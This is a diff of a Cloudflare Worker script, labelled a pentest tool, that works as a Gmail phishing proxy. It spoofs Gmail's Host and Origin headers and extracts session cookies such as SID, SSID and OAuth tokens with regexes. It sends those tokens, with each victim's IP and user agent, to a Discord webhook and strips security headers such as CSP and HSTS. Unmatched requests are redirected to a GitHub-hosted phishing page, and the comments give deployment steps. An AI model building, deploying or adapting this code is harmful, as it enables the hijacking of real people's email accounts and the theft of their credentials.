@@ -1,10 +1,9 @@
 // Gmail MitM Proxy v2.1 - PRODUCTION PENTEST READY
 // Header Spoofing + Token Theft + Session Hijack + OpSec + Rate Limiting
-// Deploy: https://dash.cloudflare.com → Workers → Create → Paste → Deploy
+// Deploy: https://dash.cloudflare.com → Workers → n-phish → Paste → Deploy
 
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR-WEBHOOK-ID-HERE'; // ← REPLACE!
 
-// Rate limiting state
 const RATE_LIMIT = new Map();
 
 addEventListener('fetch', event => {
@@ -16,7 +15,7 @@ async function handleRequest(request) {
   const clientIP = request.headers.get('CF-Connecting-IP') || 'unknown';
   const userAgent = request.headers.get('User-Agent')?.substring(0, 200) || 'unknown';
 
-  // Rate limit: 100 reqs/hour per IP
+  // RATE LIMIT: 100 reqs/hour per IP
   const now = Date.now();
   const key = `rate_${clientIP}`;
   let hits = RATE_LIMIT.get(key) || [];
@@ -27,23 +26,23 @@ async function handleRequest(request) {
   hits.push(now);
   RATE_LIMIT.set(key, hits);
 
-  // PROXY GMAIL PATHS + internals
+  // PROXY GMAIL PATHS + INTERNALS
   const proxyPaths = [
     '/mail/', '/static/', '/chrome/', '/mail/u/', '/sync/', '/accounts/',
     '/serviceworker/', '/_/', '/s/i/', '/mail/client/'
   ];
   
   if (proxyPaths.some(path => url.pathname.startsWith(path)) || url.pathname === '/') {
-    // Default to inbox for root path
     if (url.pathname === '/') url.pathname = '/mail/u/0/#inbox';
     return await proxyGmail(url, request, clientIP, userAgent);
   }
 
-  // LANDING REDIRECT
+  // FALLBACK TO GITHUB LANDING
   return Response.redirect('https://ia7353038-crypto.github.io/nINE-phish/', 302);
 }
 
 async function proxyGmail(url, request, clientIP, userAgent) {
+  // PERFECT HEADER SPOOFING
   const headers = new Headers(request.headers);
   headers.set('Host', 'mail.google.com');
   headers.set('Origin', 'https://mail.google.com');
@@ -78,13 +77,14 @@ async function proxyGmail(url, request, clientIP, userAgent) {
   }
 }
 
+// ENHANCED TOKEN EXTRACTION (SID/SSID/OAuth/Host-auth)
 function extractTokens(cookies) {
   const regexes = [
     /(SID|HSID|SSID|APISID|SAPISID|__Secure-3PSID|GAPS|G_authuser|OAuthToken)=([^;,\s]+)/gi,
     /gmail\.com=[^;,\s]+/gi,
     /__Host-user_auth_[^=]+=[^;,\s]+/gi
   ];
-  
+
   const tokens = [];
   cookies.forEach(cookieStr => {
     regexes.forEach(regex => {
@@ -97,11 +97,10 @@ function extractTokens(cookies) {
   return [...new Set(tokens.map(t => JSON.stringify(t)))].map(JSON.parse);
 }
 
+// DISCORD TOKEN EXFIL (Green=Full Session)
 async function stealTokens(tokens, ip, ua, url) {
-  const shortUA = ua.length > 100 ? ua.substring(0, 97) + '...' : ua;
-  const tokenPreview = tokens.slice(0, 5).map(t => 
-    `\`${t.name}\`: ${t.value.slice(0,20)}...`
-  ).join('\n');
+  const shortUA = ua.length > 100 ? ua.substring(0,97)+'...' : ua;
+  const preview = tokens.slice(0,5).map(t=>`\`${t.name}\`: ${t.value.slice(0,20)}...`).join('\n');
   
   const payload = {
     username: 'Gmail Proxy',
@@ -109,7 +108,7 @@ async function stealTokens(tokens, ip, ua, url) {
     embeds: [{
       title: `🔒 ${tokens.length} Gmail Token(s)`,
       description: `**IP:** \`${ip}\`\n**UA:** ${shortUA}\n**Path:** ${new URL(url).pathname}`,
-      fields: [{ name: 'Tokens', value: tokenPreview || 'None readable', inline: false }],
+      fields: [{ name: 'Tokens', value: preview || 'None readable', inline: false }],
       color: tokens.some(t => t.name.includes('SID')) ? 0x00ff00 : 0xffaa00,
       timestamp: new Date().toISOString()
     }]
@@ -120,24 +119,25 @@ async function stealTokens(tokens, ip, ua, url) {
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(payload)
   }).catch(() => {});
-
-  console.log(`PHISH HIT: ${ip} | ${tokens.map(t => t.name).join(',')}`);
+  
+  console.log(`PHISH HIT: ${ip} | ${tokens.length} tokens`);
 }
 
+// SECURITY BYPASS + COOKIE FIX
 function craftResponse(response) {
   const headers = new Headers(response.headers);
   
-  // BYPASS SECURITY HEADERS
+  // STRIP SECURITY HEADERS
   headers.delete('Content-Security-Policy');
   headers.delete('Content-Security-Policy-Report-Only');
   headers.delete('X-Frame-Options');
   headers.delete('Strict-Transport-Security');
   
-  // CORS
+  // CORS BYPASS
   headers.set('Access-Control-Allow-Origin', '*');
   headers.set('Access-Control-Allow-Credentials', 'true');
   
-  // FIX COOKIE HANDLING (CRITICAL)
+  // CRITICAL COOKIE HANDLING FIX
   const cookies = headers.getAll('Set-Cookie') || [];
   headers.delete('Set-Cookie');
   
